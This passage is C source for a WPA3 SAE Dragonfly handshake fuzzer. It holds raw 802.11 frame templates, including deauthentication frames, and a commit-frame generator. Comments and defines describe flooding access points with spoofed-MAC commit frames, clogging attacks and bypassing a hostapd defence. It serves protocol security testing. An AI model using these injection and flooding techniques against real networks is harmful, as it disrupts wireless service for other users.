/*
 * Simple SAE Dragonfly implementation.
 * Serves as basic test case generator for model based fuzzing tests against the Dragonfly handshake.
 * (C) Nikolai Tschacher 2019
 */

// TODO: Fuzzing ideas: Invalid commit token sizes, different own_scalar lengths, little endian / big endian
// encoding

// TODO: check that the received own_scalar is in the range (1,q)
// TODO: check that group own_element is valid point on curve

// TODO: - Implement the different strategies on whether a new own_element/own_scalar
//         is generated or not. This can then be used to carry out simplified
//     clogging attacks from extremely low-resource devices.
// TODO: - Add option to switch between groups to bypass new hostap defense.
// TODO: - Scan the beacon frame to see if the AP supports SAE or not.
// TODO: - Automatically determine if it also supports group 21 or 20, and then
//         use that instead of the default group 19.

/*
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 */

#define CLOCK_MONOTONIC 1
#define _REVISION "5.11.17"

#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>
#include <string.h>
#include <stdarg.h>
#include <poll.h>
#include <stdbool.h>
#include <assert.h>
#include <getopt.h>

#include <openssl/evp.h>
#include <openssl/ec.h>
#include <openssl/bn.h>
#include <openssl/hmac.h>

#include <pcap/dlt.h>
#include <aircrack-ng/osdep/osdep.h>
#include <aircrack-ng/support/common.h>
#include "version.h"

#define SAE_STATE_NOTHING 0
#define SAE_STATE_COMMITTED 1
#define SAE_STATE_CONFIRMED 2
#define STATE_ASSOCIATED 3
// when we got a valid commit frame and a well formatter confirm frame, but with invalid logic
// lets see if this state is useful
#define SAE_STATE_CONFIRM_FAILED 4

#define STATE_FUZZING_DONE 5

#define SAE_MAX_RETRANSMISSIONS 5

#define SEND_ACK 0

#define SAE_TIMEOUT_US 500000
#define SAE_TIMEOUT_CONFIRM_US 1000000

#define SHA256_DIGEST_LENGTH 32
#define SHA256_MAC_LEN 32
#define SAE_KCK_LEN 32
#define SAE_PMK_LEN 32
#define SAE_PMKID_LEN 16
#define SAE_MAX_PRIME_LEN 512

#define ETH_ALEN 6 /* Octets in one ethernet addr	 */

// define fuzzing types
#define NUM_FUZZING_TESTS 20

#define FUZZ_COMMIT_RANDOM_GROUP 0
#define FUZZ_COMMIT_RANDOM_SCALAR 1
#define FUZZ_COMMIT_RANDOM_ELEMENT 2
#define FUZZ_COMMIT_INVALID_LENGTH 3
#define FUZZ_COMMIT_RANDOM_TOKEN 4
#define FUZZ_COMMIT_INVALID_ELEMENT 5
#define FUZZ_COMMIT_ZERO_ELEMENT 6
#define FUZZ_COMMIT_RANDOM_PASSWORD_IE 7

// send variable sized anti clogging token commit auth frames
#define FUZZ_COMMIT_VARIABLE_TOKEN 8
#define FUZZ_COMMIT_VARIABLE_PASSWORD_IDENTIFIER 9
#define FUZZ_COMMIT_ALL_STATUS_CODES 10

// attempt to flood the AP with auth-commit frames
// spoof the MAC address, create random scalars and elements
#define DOS_COMMIT_FRAMES 11

// send
#define FUZZ_COMMIT_INCREASING_RANDOM_TOKEN

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000
#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

#ifndef MAC2STR
#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"

/*
 * Compact form for string representation of MAC address
 * To be used, e.g., for constructing dbus paths for P2P Devices
 */
#define COMPACT_MACSTR "%02x%02x%02x%02x%02x%02x"
#endif

#ifdef __GNUC__
#define UNUSED_VARIABLE __attribute__((unused))
#else
#define UNUSED_VARIABLE
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN
/*
 * IEEE does things bassackwards, networking in non-network order.
 */
#define ieee_order(x) (x) /* if LE, do nothing */
#else

static inline unsigned short
ieee_order(unsigned short x) /* if BE, byte-swap */
{
  return ((x & 0xff) << 8) | (x >> 8);
}

#endif /* __LITTLE_ENDIAN */

unsigned int function_mdlen = SHA256_DIGEST_LENGTH;

uint8_t AUTH_REQ_SAE_COMMIT_HEADER[] =
    /* 802.11 header */
    "\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
    "\xBB\xBB\xBB\xBB\xBB\xBB\x10\x00"  /* SAE Commit frame */
    "\x03\x00\x01\x00\x00\x00\x13\x00"; // auth algo: SAE, auth trans: 1, auth status: 0 (successful), group id
                                        /* Scalar */
                                        /* Finite Field Element - X-coordinate */
                                        /* Finite Field Element - Y-coordinate */
size_t AUTH_REQ_SAE_COMMIT_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_HEADER) - 1;

uint8_t AUTH_REQ_SAE_CONFIRM_HEADER[] =
    /* 802.11 header */
    "\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
    "\xBB\xBB\xBB\xBB\xBB\xBB\x20\x00"  /* SAE Confirm frame */
    "\x03\x00\x02\x00\x00\x00\x00\x00"; // Auth Algo (4), Auth Seq (4), Status Code (4), Send Confirm (4)
/* Confirm Token (32) */
size_t AUTH_REQ_SAE_CONFIRM_HEADER_SIZE = sizeof(AUTH_REQ_SAE_CONFIRM_HEADER) - 1;

/*
 * Documentation of the single fields
 * https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html
 */

uint8_t ASSOC_REQ_HEADER[] =
    // this is the radiotap header, we won't need that, our wifi driver will populate this himself
    /* "\x00\x00\x16\x00\x0f\x00\x00\x00\xce\x76\x1f\x72\xca\x64\x05\x00" \
    // "\x00\x02\x6c\x09\xa0\x00" \ */

    // Type/Subtype=0x00 = Association Request, Frame control field 0x0, duration: 0x3a01
    "\x00\x00\x3a\x01"                         // Receiver Address / Destination Address
    "\x02\x00\x00\x00\x03\x00"                 // transmitter address / Source Address
    "\x02\x00\x00\x00\x00\x00"                 // BSSID and sequence number: 0x3000
    "\x02\x00\x00\x00\x03\x00\x30\x00"         // fixed parameters: capabilities information and listen interval
                                               // we will need to get those values from the Beacon Frames of the access point
    "\x31\x04\x05\x00"                         // tagged parameters
                                               // SSID(0), length=8, ssid = test-sae
    "\x00\x08\x74\x65\x73\x74\x2d\x73\x61\x65" // supported rates (1), length=8,
    "\x01\x08\x02\x04\x0b\x16\x0c\x12\x18\x24"
    // extended supported rates (0x32), length=04
    "\x32\x04\x30\x48\x60\x6c"
    // RSN information (0x30), length=20, rsn version = 0x0100, group cipher suite = 00-0f-ac = AES CCM
    "\x30\x14\x01\x00\x00\x0f\xac\x04"
    // pairwise cipher suite count (0x1), pairwise cipher suite list (0x00 0f ac 04)
    "\x01\x00\x00\x0f\xac\x04"
    // auth key mgmt suite count: 1, auth key mgmt 00 0f ac 08, auth type = 08 = SAE
    "\x01\x00\x00\x0f\xac\x08" // rsn capabilities, HT capabilities (0x2d), length=0x1a
    "\x00\x00\x2d\x1a\x3c\x10\x1b\xff\xff\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    // extended capabilities (0x7f), length=0xa
    "\x7f\x0a\x04\x00\x0a\x02\x01\x40\x00\x40\x00\x01"
    // supported operating classes (0x3b), length=0x15=21
    "\x3b\x15\x51\x51\x52\x53\x54\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82" // vendor specific: microsoft information element (0xdd), length=0x07
    "\xdd\x07\x00\x50\xf2\x02\x00\x01\x00";

size_t ASSOC_REQ_HEADER_SIZE = sizeof(ASSOC_REQ_HEADER) - 1;

uint8_t ASSOC_REQ2[] =
    "\x00\x00\x00\x00\x9c\xef\xd5\xfc\x0e\xa8\xc8\xf7\x33\xd4\x5a\xe9"
    "\x9c\xef\xd5\xfc\x0e\xa8\x00\x00\x11\x00\x0a\x00\x00\x0c\x57\x50"
    "\x41\x33\x5f\x4e\x65\x74\x77\x6f\x72\x6b\x01\x08\x0c\x12\x18\x24"
    "\x30\x48\x60\x6c";

uint8_t ACK_FRAME[] = "\xd4\x00\x00\x00\x9c\xef\xd5\xfc\x0e\xa8";

uint8_t ACK_HEADER[] =
    /* 802.11 header */         // we don't need the radiotap header!
                                // "\x00\x00\x0e\x00\x0a\x00\x00\x00\x00\x00\x6c\x09\x80\x00"
    "\xd4\x00"                  // Type/Subtype: Acknowledgement (0xd4 0x00)
    "\x00\x00"                  // duration
    "\x02\x00\x00\x00\x03\x00"; // last 6 bytes are the destination MAC address
size_t ACK_HEADER_SIZE = sizeof(ACK_HEADER) - 1;

uint8_t DEAUTH_FRAME[] =
    "\xc0\x00\x00\x00\xc8\xf7\x33\xd4\x5a\xe9\x9c\xef\xd5\xfc\x0e\xa8"
    "\x9c\xef\xd5\xfc\x0e\xa8\x00\x00"
    "\x02\x00"; // reason code: Previous auth no longer valid

size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;

uint8_t DISASSOCIATION_FRAME[] =
    "\xa0\x00\x00\x00\xc8\xf7\x33\xd4\x5a\xe9\x9c\xef\xd5\xfc\x0e\xa8"
    "\x9c\xef\xd5\xfc\x0e\xa8\x00\x00"
    "\x08\x00"; // reason code: STA is leaving

size_t DISASSOCIATION_FRAME_SIZE = sizeof(DISASSOCIATION_FRAME) - 1;

static struct state
{
  struct wif *wi;
  unsigned char password[80];
  unsigned char bssid[6];
  unsigned char srcaddr[6];
  int debug_level;

  /** fuzzing state variables **/
  int randomize_mac;
  unsigned char fuzzing_tests[50];
  int retransmission_enabled;

  int sae_state;

  /** Injection parameters */
  int injection_bitrate;

  /** Various variables */
  int nextaddr;
  int time_fd_inject;
  int only_deauth;

  /* Variables from beacon frames */
  int beacon_processed;
  unsigned char ap_capability_information[2];
  unsigned char ap_tagged_params_from_beacon_for_assoc[61];

  /** Crypto variables */
  int groupid;
  const EC_GROUP *group;
  const EC_POINT *generator;
  EC_POINT *own_element;
  BIGNUM *prime;
  BIGNUM *a;
  BIGNUM *b;
  BIGNUM *order;
  BN_CTX *bnctx;
  BIGNUM *own_scalar;
  EC_POINT *PWE;

  /** Peer Commit Variables   */
  int peer_groupid;
  BIGNUM *mask;
  BIGNUM *private_val;
  BIGNUM *peer_scalar;
  EC_POINT *peer_element;

  /** Key Variables derived for SAE Confirm */
  BIGNUM *k;
  EC_POINT *K;
  unsigned char kck[SAE_KCK_LEN];
  unsigned char pmk[SAE_PMK_LEN];
  unsigned char pmkid[SAE_PMKID_LEN];
  unsigned char confirm_token[SHA256_MAC_LEN];
  unsigned char peer_confirm_token[SHA256_MAC_LEN];

  /** For monitoring status */
  unsigned short num_auth_commit;
  unsigned short num_auth_confirm;
  unsigned short send_confirm;
  unsigned short peer_send_confirm;
  int time_fd_status;
  int sent_commits;
  int rx_clogging_token;
  int rx_commits;
  int rx_confirms;

  int rx_beacons;
  struct timespec first_beacon;

  /** For detecting's hostapd dev version queuing */
  int total_running_time;
} _state;

static struct state *get_state(void) { return &_state; }

void print_status(struct state *state);

static void print_EC_POINT(struct state *state, EC_POINT *P, char *msg)
{
  BIGNUM *x = BN_new();
  BIGNUM *y = BN_new();

  if (EC_POINT_get_affine_coordinates_GFp(state->group, P, x, y, NULL))
  {
    printf("%s EC_POINT = (\n\t", msg);
    BN_print_fp(stdout, x);
    printf(",\n\t");
    BN_print_fp(stdout, y);
    printf("\n");
    printf(")\n");
  }

  BN_free(x);
  BN_free(y);
}

static void
print_bignum(char *peer_name, char *fmt, BIGNUM *bn)
{
  printf(fmt, peer_name);
  BN_print_fp(stdout, bn);
  printf("\n");
}

static void hexdump(struct state *state, int level, const void *data, size_t size)
{
  if (state->debug_level < level)
    return;

  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i)
  {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
    {
      ascii[i % 16] = ((unsigned char *)data)[i];
    }
    else
    {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size)
    {
      printf(" ");
      if ((i + 1) % 16 == 0)
      {
        printf("|  %s \n", ascii);
      }
      else if (i + 1 == size)
      {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8)
        {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j)
        {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
  printf("\n");
}

static void debug(struct state *state, int level, char *fmt, ...)
{
  va_list ap;

  if (state->debug_level < level)
    return;

  printf("\r\x1b[0K");

  va_start(ap, fmt);
  vprintf(fmt, ap);
  va_end(ap);

  // print_status(state);
}

static int vsystem(const char *format, ...)
{
  char command[1024];
  va_list ap;

  va_start(ap, format);
  vsnprintf(command, sizeof(command), format, ap);
  va_end(ap);

  return system(command);
}

static void card_open(struct state *state, char *dev)
{
  struct wif *wi = wi_open(dev);

  if (!wi)
    err(1, "wi_open()");
  state->wi = wi;
}

static inline int card_set_chan(struct state *state, int chan)
{
  return wi_set_channel(state->wi, chan);
}

static inline int card_get_chan(struct state *state)
{
  return wi_get_channel(state->wi);
}

static int int_to_bitrate(int rate)
{
  switch (rate)
  {
  case 1:
    return RATE_1M;
  case 2:
    return RATE_2M;
  case 5:
    return RATE_5_5M;
  case 11:
    return RATE_11M;
  case 6:
    return RATE_6M;
  case 9:
    return RATE_9M;
  case 12:
    return RATE_12M;
  case 18:
    return RATE_18M;
  case 24:
    return RATE_24M;
  case 36:
    return RATE_36M;
  case 48:
    return RATE_48M;
  case 54:
    return RATE_54M;
  default:
    return RATE_1M;
  }
}

/* Source: ELL
 */

#define L_PUT_UNALIGNED(val, ptr)    \
  do                                 \
  {                                  \
    struct __attribute__((packed))   \
    {                                \
      __typeof__(*(ptr)) __v;        \
    } *__p = (__typeof__(__p))(ptr); \
    __p->__v = (val);                \
  } while (0)

#define L_CPU_TO_LE16(val) (val)

static inline void l_put_le16(uint16_t val, void *ptr)
{
  L_PUT_UNALIGNED(L_CPU_TO_LE16(val), (uint16_t *)ptr);
}

/**
 * Making the ath9k_htc use a specific bitrate to inject packets
 * is tedious. Two common methods fail with this device:
 *
 * - The bitrate field in the RadioTap header is ignored.
 * - Executing `iw dev set bitrates legacy-2.4 $bitrate` on a device
 *   in monitor mode results in an error.
 *
 * We opt for the following workaround: we first put the device into
 * managed mode, and then execute `iw dev set bitrates legacy-2.4 $bitrate`.
 * This command does work when the device is in managed mode. We then
 * switch the device back to monitor mode. Interestinly, the device
 * will keep using the configured bitrate even after switching to
 * monitor mode.
 *
 * Although the above workaround is ugly, it works without having to
 * make the user recompile the kernel or installing custom drivers.
 * The downside is that it has only been tested with ath9k_htc.
 */
static int card_set_rate_workaround(struct state *state, int rate)
{
  char interface[MAX_IFACE_NAME];

  // Copy interface name, and close the interface
  strcpy(interface, state->wi->wi_interface);
  wi_close(state->wi);

  // Easiest is to just call ifconfig and iw
  if (vsystem("ifconfig %s down", interface) ||
      vsystem("iw %s set type managed", interface) ||
      vsystem("ifconfig %s up", interface) ||
      vsystem("iw %s set bitrates legacy-2.4 %d", interface, rate) ||
      vsystem("ifconfig %s down", interface) ||
      vsystem("iw %s set type monitor", interface) ||
      vsystem("ifconfig %s up", interface))
  {
    fprintf(stderr, "Failed to set bitrate to %d using workaround method\n", rate);
    return 1;
  }

  // Open interface again
  state->wi = wi_open(interface);

  return 0;
}

static inline int card_set_rate(struct state *state, int rate)
{
  if (wi_set_rate(state->wi, int_to_bitrate(rate)))
  {
    /* Attempt workaround to set the desired bitrate */
    return card_set_rate_workaround(state, rate);
  }

  return 0;
}

static inline int card_get_rate(struct state *state)
{
  return wi_get_rate(state->wi);
}

static inline int card_get_monitor(struct state *state)
{
  return wi_get_monitor(state->wi);
}

static int
card_read(struct state *state, void *buf, int len, struct rx_info *ri)
{
  int rc;

  struct timespec ts;
  int dlt = 0;
  if ((rc = wi_read(state->wi, &ts, &dlt, buf, len, ri)) == -1)
    err(1, "wi_read()");

  return rc;
}

static inline int
card_write(struct state *state, void *buf, int len, struct tx_info *ti)
{
  int dlt = DLT_IEEE802_11;
  return wi_write(state->wi, NULL, &dlt, buf, len, ti);
}

static inline int card_get_mac(struct state *state, unsigned char *mac)
{
  return wi_get_mac(state->wi, mac);
}

static void
open_card(struct state *state, char *dev, int chan)
{
  debug(state, 0, "[i] Opening card %s\n", dev);
  card_open(state, dev);
  debug(state, 0, "[i] Setting to channel %d\n", chan);
  if (card_set_chan(state, chan) == -1)
    err(1, "card_set_chan()");
}

static inline void WPA_PUT_LE16(unsigned char *a, unsigned char val)
{
  a[1] = val >> 8;
  a[0] = val & 0xff;
}

static int
prf(unsigned char *key, int keylen, unsigned char *label, int labellen,
    unsigned char *context, int contextlen,
    unsigned char *result, int resultbitlen)
{
  HMAC_CTX *ctx;
  unsigned char digest[SHA256_DIGEST_LENGTH];
  int resultlen, len = 0;
  unsigned int mdlen = SHA256_DIGEST_LENGTH;
  unsigned char mask = 0xff;
  unsigned short reslength;
  unsigned short i = 0, i_le;

  if ((ctx = HMAC_CTX_new()) == NULL)
  {
    return -1;
  }

  reslength = ieee_order(resultbitlen);
  resultlen = (resultbitlen + 7) / 8;
  do
  {
    i++;
    HMAC_Init_ex(ctx, key, keylen, EVP_sha256(), NULL);
    i_le = ieee_order(i);
    HMAC_Update(ctx, (unsigned char *)&i_le, sizeof(unsigned short));
    HMAC_Update(ctx, label, labellen);
    HMAC_Update(ctx, context, contextlen);
    HMAC_Update(ctx, (unsigned char *)&reslength, sizeof(unsigned short));
    HMAC_Final(ctx, digest, &mdlen);
    if ((len + mdlen) > resultlen)
    {
      memcpy(result + len, digest, resultlen - len);
    }
    else
    {
      memcpy(result + len, digest, mdlen);
    }
    len += mdlen;
  } while (len < resultlen);

  HMAC_CTX_free(ctx);

  /*
   * we're expanding to a bit length, if this is not a
   * multiple of 8 bits then mask off the excess.
   */
  if (resultbitlen % 8)
  {
    mask <<= (8 - (resultbitlen % 8));
    result[resultlen - 1] &= mask;
  }
  return resultlen;
}

/*
 * calculate the legendre symbol (a/p)
 */
static int
legendre(BIGNUM *a, BIGNUM *p, BIGNUM *exp, BN_CTX *bnctx)
{
  BIGNUM *tmp = NULL;
  int symbol = -1;

  if ((tmp = BN_new()) != NULL)
  {
    BN_mod_exp(tmp, a, exp, p, bnctx);
    if (BN_is_word(tmp, 1))
      symbol = 1;
    else if (BN_is_zero(tmp))
      symbol = 0;
    else
      symbol = -1;

    BN_free(tmp);
  }
  return symbol;
}

static int
prepare_commit(struct state *state)
{

  if (((state->mask = BN_new()) == NULL) ||
      ((state->private_val = BN_new()) == NULL))
  {
    fprintf(stderr, "Unable to allocate BN for random variables!\n");
    return -1;
  }

  /*
   * generate private values r_sta and m_sta
   */
  BN_rand_range(state->private_val, state->order);
  BN_rand_range(state->mask, state->order);

  if ((state->own_scalar = BN_new()) == NULL ||
      (state->peer_scalar = BN_new()) == NULL)
  {
    fprintf(stderr, "unable to allocate BN for own_scalar and peer_scalar!\n");
    return -1;
  }

  /*
   * generate s_sta = (r_sta + m_sta) mod order
   */
  BN_add(state->own_scalar, state->private_val, state->mask);
  BN_mod(state->own_scalar, state->own_scalar, state->order, state->bnctx);

  if (state->debug_level > 0)
  {
    print_bignum("station", "[%s] own own_scalar: ", state->own_scalar);
  }

  if ((state->own_element = EC_POINT_new(state->group)) == NULL ||
      (state->peer_element = EC_POINT_new(state->group)) == NULL)
  {
    fprintf(stderr, "unable to allocate BN for own_element and peer_element!\n");
    return -1;
  }

  /*
   * generate E_sta = -(m_sta * PWE)
   */
  if (!EC_POINT_mul(state->group, state->own_element, NULL, state->PWE, state->mask, state->bnctx))
  {
    fprintf(stderr, "unable to compute own_element!\n");
    return -1;
  }

  if (!EC_POINT_invert(state->group, state->own_element, state->bnctx))
  {
    fprintf(stderr, "unable to invert E_sta!\n");
    return -1;
  }

  if (state->debug_level > 1)
  {
    print_bignum("station", "[%s] random private value: ", state->private_val);
    print_bignum("station", "[%s] random mask value: ", state->mask);
    print_EC_POINT(state, state->own_element, "own element");
  }

  return 0;
}

/*
 * The group has been selected, assign it to the peer and create PWE.
 */
static int
derive_PWE(struct state *state)
{
  HMAC_CTX *ctx;
  ctx = HMAC_CTX_new();
  BIGNUM *x_candidate = NULL, *x = NULL, *rnd = NULL, *qr = NULL, *qnr = NULL;
  BIGNUM *pm1 = NULL, *pm1d2 = NULL, *tmp1 = NULL, *tmp2 = NULL, *a = NULL, *b = NULL;
  unsigned char pwe_digest[SHA256_DIGEST_LENGTH], addrs[ETH_ALEN * 2], ctr;
  unsigned char *prfbuf = NULL, *primebuf = NULL;
  int primebitlen, is_odd, check, found = 0;

  if (((rnd = BN_new()) == NULL) ||
      ((pm1d2 = BN_new()) == NULL) ||
      ((pm1 = BN_new()) == NULL) ||
      ((tmp1 = BN_new()) == NULL) ||
      ((tmp2 = BN_new()) == NULL) ||
      ((a = BN_new()) == NULL) ||
      ((b = BN_new()) == NULL) ||
      ((qr = BN_new()) == NULL) ||
      ((qnr = BN_new()) == NULL) ||
      ((x_candidate = BN_new()) == NULL))
  {
    fprintf(stderr, "can't create bignum for candidate!\n");
    goto fail;
  }

  if ((prfbuf = (unsigned char *)malloc(BN_num_bytes(state->prime))) == NULL)
  {
    fprintf(stderr, "unable to malloc space for prf buffer!\n");
    goto fail;
  }
  if ((primebuf = (unsigned char *)malloc(BN_num_bytes(state->prime))) == NULL)
  {
    fprintf(stderr, "unable to malloc space for prime!\n");
    goto fail;
  }
  BN_bn2bin(state->prime, primebuf);
  primebitlen = BN_num_bits(state->prime);

  if (!EC_GROUP_get_curve_GFp(state->group, NULL, a, b, NULL))
  {
    free(prfbuf);
  }

  BN_sub(pm1, state->prime, BN_value_one());
  BN_copy(tmp1, BN_value_one());
  BN_add(tmp1, tmp1, BN_value_one());
  BN_div(pm1d2, tmp2, pm1, tmp1, state->bnctx); /* (p-1)/2 */

  /*
   * generate a random quadratic residue modulo p and a random
   * quadratic non-residue modulo p.
   */
  do
  {
    BN_rand_range(qr, pm1);
  } while (legendre(qr, state->prime, pm1d2, state->bnctx) != 1);
  do
  {
    BN_rand_range(qnr, pm1);
  } while (legendre(qnr, state->prime, pm1d2, state->bnctx) != -1);
  memset(prfbuf, 0, BN_num_bytes(state->prime));

  debug(state, 1, "[i] Computing PWE on %d bit curve number %d\n", primebitlen, state->groupid);

  ctr = 0;
  while (ctr < 40)
  {
    ctr++;
    /*
     * compute counter-mode password value and stretch to prime
     *
     * peer mac = state->bssid
     * own mac = state->srcaddr
     */
    if (memcmp(state->bssid, state->srcaddr, ETH_ALEN) > 0)
    {
      debug(state, 3, "SAE: PWE derivation - addr1=" MACSTR " addr2=" MACSTR "\n", MAC2STR(state->bssid), MAC2STR(state->srcaddr));
      memcpy(addrs, state->bssid, ETH_ALEN);
      memcpy(addrs + ETH_ALEN, state->srcaddr, ETH_ALEN);
    }
    else
    {
      debug(state, 3, "SAE: PWE derivation - addr1=" MACSTR " addr2=" MACSTR "\n", MAC2STR(state->srcaddr), MAC2STR(state->bssid));
      memcpy(addrs, state->srcaddr, ETH_ALEN);
      memcpy(addrs + ETH_ALEN, state->bssid, ETH_ALEN);
    }

    HMAC_Init_ex(ctx, addrs, (ETH_ALEN * 2), EVP_sha256(), NULL);
    HMAC_Update(ctx, state->password, strlen(state->password));
    HMAC_Update(ctx, &ctr, sizeof(ctr));
    HMAC_Final(ctx, pwe_digest, &function_mdlen);

    if (state->debug_level > 3)
    {
      if (memcmp(state->bssid, state->srcaddr, ETH_ALEN) > 0)
      {
        printf("H(" MACSTR " | " MACSTR ", %s | %d)\n",
               MAC2STR(state->bssid), MAC2STR(state->srcaddr), state->password, ctr);
      }
      else
      {
        printf("H(" MACSTR " | " MACSTR ", %s | %d)\n",
               MAC2STR(state->srcaddr), MAC2STR(state->bssid), state->password, ctr);
      }
      hexdump(state, 3, pwe_digest, SHA256_DIGEST_LENGTH);
    }

    BN_bin2bn(pwe_digest, SHA256_DIGEST_LENGTH, rnd);
    prf(pwe_digest, SHA256_DIGEST_LENGTH,
        (unsigned char *)"SAE Hunting and Pecking", strlen("SAE Hunting and Pecking"),
        primebuf, BN_num_bytes(state->prime),
        prfbuf, primebitlen);
    BN_bin2bn(prfbuf, BN_num_bytes(state->prime), x_candidate);
    /*
     * prf() returns a string of bits 0..primebitlen, but BN_bin2bn will
     * treat that string of bits as a big-endian number. If the primebitlen
     * is not an even multiple of 8 we masked off the excess bits-- those
     * _after_ primebitlen-- in prf() so now interpreting this as a
     * big-endian number is wrong. We have to shift right the amount we
     * masked off.
     */
    if (primebitlen % 8)
    {
      BN_rshift(x_candidate, x_candidate, (8 - (primebitlen % 8)));
    }

    /*
     * if this candidate value is greater than the prime then try again
     */
    if (BN_ucmp(x_candidate, state->prime) >= 0)
    {
      continue;
    }

    if (state->debug_level > 3)
    {
      print_bignum("station", "Candidate x value: ", x_candidate);
    }

    /*
     * compute y^2 using the equation of the curve
     *
     *      y^2 = x^3 + ax + b
     */
    BN_mod_sqr(tmp1, x_candidate, state->prime, state->bnctx);
    BN_mod_mul(tmp2, tmp1, x_candidate, state->prime, state->bnctx);
    BN_mod_mul(tmp1, a, x_candidate, state->prime, state->bnctx);
    BN_mod_add_quick(tmp2, tmp2, tmp1, state->prime);
    BN_mod_add_quick(tmp2, tmp2, b, state->prime);

    /*
     * mask tmp2 so doing legendre won't leak timing info
     *
     * tmp1 is a random number between 1 and p-1
     */
    BN_rand_range(tmp1, pm1);

    BN_mod_mul(tmp2, tmp2, tmp1, state->prime, state->bnctx);
    BN_mod_mul(tmp2, tmp2, tmp1, state->prime, state->bnctx);
    /*
     * now tmp2 (y^2) is masked, all values between 1 and p-1
     * are equally probable. Multiplying by r^2 does not change
     * whether or not tmp2 is a quadratic residue, just masks it.
     *
     * flip a coin, multiply by the random quadratic residue or the
     * random quadratic nonresidue and record heads or tails
     */
    if (BN_is_odd(tmp1))
    {
      BN_mod_mul(tmp2, tmp2, qr, state->prime, state->bnctx);
      check = 1;
    }
    else
    {
      BN_mod_mul(tmp2, tmp2, qnr, state->prime, state->bnctx);
      check = -1;
    }
    /*
     * now it's safe to do legendre, if check is 1 then it's
     * a straightforward test (multiplying by qr does not
     * change result), if check is -1 then its the opposite test
     * (multiplying a qr by qnr would make a qnr)
     */
    if (legendre(tmp2, state->prime, pm1d2, state->bnctx) == check)
    {
      if (found == 1)
      {
        continue;
      }
      /*
       * need to unambiguously identify the solution, if there is one...
       */
      if (BN_is_odd(rnd))
      {
        is_odd = 1;
      }
      else
      {
        is_odd = 0;
      }
      if ((x = BN_dup(x_candidate)) == NULL)
      {
        goto fail;
      }
      debug(state, 2, "\nit took %d tries to find PWE: %d\n\n", ctr, state->groupid);
      found = 1;
    }
  }
  /*
   * 2^-40 is about one in a trillion so we should always find a point.
   * When we do, we know x^3 + ax + b is a quadratic residue so we can
   * assign a point using x and our discriminator (is_odd)
   */
  if ((found == 0) ||
      (!EC_POINT_set_compressed_coordinates_GFp(state->group, state->PWE, x, is_odd, state->bnctx)))
  {
    fprintf(stderr, "Could not find PWE after 40 iterations.");
    EC_POINT_free(state->PWE);
    state->PWE = NULL;
  }
fail:
  if (prfbuf != NULL)
  {
    free(prfbuf);
  }
  if (primebuf != NULL)
  {
    free(primebuf);
  }
  if (found)
  {
    BN_free(x);
  }
  BN_free(x_candidate);
  BN_free(rnd);
  BN_free(pm1d2);
  BN_free(pm1);
  BN_free(tmp1);
  BN_free(tmp2);
  BN_free(a);
  BN_free(b);
  BN_free(qr);
  BN_free(qnr);
  HMAC_CTX_free(ctx);

  if (state->PWE == NULL)
  {
    fprintf(stderr, "unable to find random point on curve for group %d, something's fishy!\n",
            state->groupid);
    return -1;
  }

  if (state->debug_level > 1)
  {
    print_EC_POINT(state, state->PWE, "PWE");
    printf("[i] Assigning group %d to peer, the size of the prime is %d\n",
           state->groupid, BN_num_bytes(state->prime));
  }

  return 0;
}

int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen)
{
  int num_bytes = BN_num_bytes(num);
  int offset = outlen - num_bytes;

  memset(buf, 0, offset);
  BN_bn2bin(num, buf + offset);

  return 0;
}

uint8_t *ecc_point2bin(struct state *state, EC_POINT *point, uint8_t *out)
{
  int num_bytes = BN_num_bytes(state->prime);
  BIGNUM *bignum_x = BN_new();
  BIGNUM *bignum_y = BN_new();
  // XXX check allocation results

  // XXX check return value
  EC_POINT_get_affine_coordinates_GFp(state->group, point, bignum_x, bignum_y, state->bnctx);

  // XXX check if out buffer is large enough
  bignum2bin(bignum_x, out, num_bytes);
  bignum2bin(bignum_y, out + num_bytes, num_bytes);

  BN_free(bignum_y);
  BN_free(bignum_x);

  return out + 2 * num_bytes;
}

/*
 * -------------------------
 * Start fuzzing management functions.
 */

/*
 * Initialize fuzzing states.
 *
 * -: fuzzing test not enabled/null
 * e: fuzzing test is enabled
 * d: fuzzing test is performing
 * f: fuzzing test is finished, this is the case after the deauth was sent
 * x: fuzzing test failed for some reason
